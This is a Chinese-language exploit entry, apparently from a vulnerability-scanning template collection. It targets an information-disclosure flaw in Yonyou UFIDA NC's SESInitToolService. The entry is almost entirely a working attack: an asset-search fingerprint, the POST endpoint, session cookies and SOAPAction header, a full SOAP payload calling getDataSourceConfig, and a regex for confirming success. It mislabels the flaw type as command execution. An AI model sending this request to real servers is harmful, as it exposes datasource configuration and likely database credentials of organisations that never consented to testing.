# 用友UFIDANCgetDataSourceConfig信息泄露漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="用友 UFIDA NC"`
- **请求**：`POST /uapws/service/nc.itf.ses.inittool.SESInitToolService HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=57CC01E2D28AFE5F2A476BFF030D601A.ncServer; JSESSIONID=95BB77917927DCB…`　`SOAPAction: urn:getDataSourceConfig`　`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ses="http://inittool.ses.itf.nc/SESInitToolService">
<soapenv:Header/>
<soapenv:Body>
<ses:getDataSourceConfig/>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　^(?=.*?soap)(?=.*?datasource).*?$